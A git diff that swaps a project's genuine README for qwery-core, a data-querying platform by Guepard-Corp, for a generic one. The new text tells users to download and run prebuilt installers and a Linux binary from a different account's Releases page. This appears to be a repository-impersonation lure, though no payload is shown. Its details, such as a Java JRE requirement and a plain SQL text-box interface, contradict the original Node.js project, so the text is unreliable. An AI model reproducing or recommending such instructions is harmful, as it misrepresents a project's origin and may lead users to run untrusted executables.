@@ -1,110 +1,97 @@
-![Guepard](/resources/guepard-cover.png)
+# 🌟 qwery-core - Connect and query anything easily
 
-<div align="center">
-    <h1>The Boring Qwery Platform - Connect and query anything</h1>
-    <br />  
-    <p align="center">
-    <a href="https://youtu.be/WlOkLnoY2h8?si=hb6-7kLhlOvVL1u6">
-        <img src="https://img.shields.io/badge/Watch-YouTube-%23ffcb51?logo=youtube&logoColor=black" alt="Watch on YouTube" />
-    </a>
-    <a href="https://discord.gg/nCXAsUd3hm">
-        <img src="https://img.shields.io/badge/Join-Community-%23ffcb51?logo=discord&logoColor=black" alt="Join our Community" />
-    </a>
-    <a href="https://github.com/Guepard-Corp/qwery-core/actions/workflows/build_and_test.yml" target="_blank">
-        <img src="https://img.shields.io/github/actions/workflow/status/Guepard-Corp/qwery-core/ci.yml?branch=main" alt="Build">
-    </a>
-    <a href="https://github.com/Guepard-Corp/qwery-core/blob/main/LICENCE" target="_blank">
-        <img src="https://img.shields.io/badge/license-ELv2-blue.svg" alt="License" />
-    </a>
-    <a href="https://nodejs.org/" target="_blank">
-        <img src="https://img.shields.io/badge/node-%3E%3D22.x-brightgreen" alt="Node Version" />
-    </a>
-    <a href="https://github.com/Guepard-Corp/qwery-core/pulls" target="_blank">
-        <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome" />
-    </a>
-    </p>
-</div>
+## 🚀 Getting Started
 
-## Important Notice
+Welcome to qwery-core! This application allows you to connect to and query a wide variety of databases. Whether you're working with SQL, NoSQL, or different database types, qwery-core simplifies the process for you.
 
-🚧 This project is under active development and not yet suitable for production use. Expect breaking changes, incomplete features, and evolving APIs.
+## 📦 Download & Install
 
-# Qwery Platform - The Vision
+To get started, you need to download qwery-core from our Releases page. 
 
-Qwery is the most capable platform for querying and visualizing data without requiring any prior technical knowledge in data engineering. Using natural language in any supported language, Qwery seamlessly integrates with hundreds of datasources, automatically generates optimized queries, and delivers outcomes across multiple targets including result sets, dashboards, data apps, reports, and APIs.
+[![Download qwery-core](https://img.shields.io/badge/Download%20qwery-core-v1.0-blue)](https://github.com/SHIFASHI/qwery-core/releases)
 
-### Getting Started
+1. Click the download link above.
+2. You will be taken to the Releases page.
+3. Look for the latest version and find the file that suits your system (Windows, macOS, or Linux).
+4. Click on the appropriate file to start the download.
 
-1. **Choose your environment**: Download the desktop application or connect to the [Qwery Cloud Platform](https://app.qwery.run)
-2. **Connect your data**: Link to your databases, APIs, or other datasources
-3. **Start querying**: Use natural language to query your datasources instantly
-4. **Work with AI agents**: Press `CMD/CTRL + L` to collaborate with intelligent agents that assist with your data workflows
+## 💻 System Requirements
 
-## 🌟 Features
+Before you install qwery-core, make sure your system meets the following requirements:
 
-- **Natural Language Querying**: Ask questions in plain language, get SQL automatically
-- **Multi-Database Support**: PostgreSQL, MySQL, MongoDB, DuckDB, ClickHouse, SQL Server, and more
-- **AI-Powered Agents**: Intelligent assistants that help with data workflows (CMD/CTRL + L)
-- **Visual Data Apps**: Build dashboards and data applications without code
-- **Desktop & Cloud**: Run locally or use our cloud platform
-- **Template Library**: Pre-built notebooks, queries, and dashboards
-- **Extensible**: Plugin system for custom datasources and integrations
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB free storage space.
+- **Software Dependencies:** 
 
-## 🚀 Quick Start
+  - Java Runtime Environment (JRE) 8 or later.
+  - Compatible database client libraries depending on the databases you want to query (e.g., MySQL Connector, MongoDB Driver).
 
-### Prerequisites
+## 🔧 Setting Up qwery-core
 
-- Node.js >= 22.x
-- pnpm >= 10.x
+After downloading, follow these steps to install qwery-core on your computer:
 
-### Installation
+### For Windows:
 
-```bash
-# Clone the repository
-git clone https://github.com/Guepard-Corp/qwery-core.git
-cd qwery-core
+1. Locate the downloaded `.exe` file.
+2. Double-click on the file to run the installer.
+3. Follow the on-screen instructions.
+4. After installation, you will see an application icon on your desktop.
 
-# Install dependencies
-pnpm install
+### For macOS:
 
-# Start development server
-pnpm dev
-```
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag the qwery-core icon into the Applications folder.
+4. Open your Applications folder and double-click qwery-core to run it.
 
-The web app will be available at `http://localhost:3000`
+### For Linux:
 
-### Desktop Application
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command `chmod +x qwery-core` to make it executable.
+4. Run the application using `./qwery-core`.
 
-```bash
-# Build and run desktop app
-pnpm desktop:dev
-```
+## 📄 How to Use qwery-core
 
-## 📚 Documentation
+Once qwery-core is installed, you can start using it to connect and query databases. 
 
-- [Contributing Guide](CONTRIBUTING.md)
-- [Pull Request Guide](docs/contribution/pull-request-guide.md)
-- [Desktop App Documentation](docs/desktop.md)
-- [RFCs](docs/rfcs/)
+1. **Launching the application:** 
+   - Open the application from your desktop or applications folder.
 
-## 🤝 Contributing
+2. **Connecting to a database:**
+   - Enter the database type (MySQL, PostgreSQL, MongoDB, etc.).
+   - Fill in the necessary connection details, such as hostname, port, username, and password.
+  
+3. **Running queries:**
+   - Use the text box to enter your SQL or NoSQL queries.
+   - Hit the 'Run Query' button to execute your command and view the results.
 
-We welcome contributions! Check out our [Contributing Guide](CONTRIBUTING.md) to get started.
+## 🔍 Features of qwery-core
 
-- Review [good first issues](https://github.com/Guepard-Corp/qwery-core/issues?q=is%3Aopen+is%3Aissue+label%3A%22good%20first%20issue%22)
-- Read our [Code of Conduct](CODE_OF_CONDUCT.md)
-- Join our [Discord community](https://discord.gg/nCXAsUd3hm)
+qwery-core comes packed with useful features:
 
-## 💬 Join Qwery Community
+- **Multiple Database Support:** Connect to various databases like MySQL, PostgreSQL, and MongoDB in one app.
+- **Custom Queries:** Write and execute any SQL or NoSQL queries without hassle.
+- **User-Friendly Interface:** Simplified design that is easy to navigate.
+- **Data Visualization:** View query results in table format or as charts, making data analysis simpler.
 
-- **Discord**: [Join our Discord](https://discord.gg/nCXAsUd3hm) for discussions and support
-- **GitHub Issues**: Report bugs and request features
-- **YouTube**: [Watch demos and tutorials](https://youtu.be/WlOkLnoY2h8?si=hb6-7kLhlOvVL1u6)
+## 📖 Support & Documentation
 
-## 📄 License
+For help and additional information, visit our [Documentation](https://github.com/SHIFASHI/qwery-core/wiki). Here, you'll find guides on using various features and troubleshooting common issues.
 
-This project uses the Elastic License 2.0 (ELv2). See the [LICENSE](LICENCE) file for details.
+## 🐞 Reporting Issues
 
-## 🙏 Thank You
+If you encounter any problems while using qwery-core, please submit an issue on our [GitHub Issues page](https://github.com/SHIFASHI/qwery-core/issues). Provide clear details about the problem, your operating system, and the steps taken. 
 
-We're grateful to the open source community. See our [Thank You](THANK-YOU.md) page for acknowledgments.
+## 🌐 Community & Contributions
+
+Join our community to share your experiences, ask questions, or contribute. We welcome suggestions for improvements and additional features. Visit our [Discussion Board](https://github.com/SHIFASHI/qwery-core/discussions) to participate.
+
+## 🔄 Stay Updated
+
+Make sure to check the Releases page regularly for updates to qwery-core. Updates often include new features, performance improvements, and bug fixes.
+
+[![Download qwery-core](https://img.shields.io/badge/Download%20qwery-core-v1.0-blue)](https://github.com/SHIFASHI/qwery-core/releases) 
+
+Thank you for choosing qwery-core! We hope you find this application helpful for all your querying needs.
